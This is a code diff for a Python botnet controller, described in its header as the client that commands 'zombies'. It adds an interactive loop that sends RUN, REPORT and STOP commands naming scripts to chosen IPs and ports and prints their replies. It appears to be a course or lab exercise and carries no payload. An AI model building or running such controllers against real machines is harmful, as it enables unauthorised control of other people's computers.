@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 #####################################
 # Client that controls the zombies  #
 # in botnet                         #
@@ -15,10 +17,15 @@ def bufferMessages(sock):
     finalBuffer = ""
     # Parse into buffer
     while True:
+        print("buffering")
         chunk = sock.recv(1024).decode()
         if not chunk:
             break
         finalBuffer += chunk
+        if "\r\n\r\n" in finalBuffer:
+            break
+
+    return finalBuffer
     
 def main():
     # Get input
@@ -33,20 +40,39 @@ def main():
         # Associate IP with ports in the dictionary
         ipDictionary[ip] = portArray
 
-    # Iterate through the IP-port dictionary
-    for ip, ports in ipDictionary.items():
-        for port in ports:
-            # Define the socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        command = input("Enter command (or 'DISCONNECT' to exit):\n")
+        
+        if command == "DISCONNECT":
+            break
 
-            # Connect to each IP and port
-            try:
-                sock.connect((ip, int(port)))
-                print(f"Connected to {ip}:{port}")
-            except Exception as e:
-                print(f"Failed to connect to {ip}:{port}. Error: {e}")
-            finally:
-                # Close the socket after connecting or failing to connect
-                sock.close()
+        # Assuming the command format is "RUN *.py <IP> <port>"
+        if command.startswith("RUN") or command.startswith("REPORT") or command.startswith("STOP"):
+            parts = command.split()
+            if len(parts) == 4:
+                method, scriptName, ip, port = parts[0], parts[1], parts[2], parts[3]
+
+                message = method + " " + scriptName 
+                message += "\r\n\r\n"
+
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+                try:
+                    sock.connect((ip, int(port)))
+                    print(f"Connected to {ip}:{port}")
+
+                    sock.send(message.encode())
+
+                    print("Response: " + bufferMessages(sock))
+
+                except Exception as e:
+                    print(f"Failed to connect to {ip}:{port}. Error: {e}")
+                finally:
+                    sock.close()
+            else:
+                print("Invalid command format. Please use 'RUN/REPORT/STOP *.py <IP> <port>'.")
+
+        else:
+            print("Invalid command. Please use 'RUN/REPORT/STOP *.py <IP> <port>' or 'DISCONNECT'.")
 
 main()
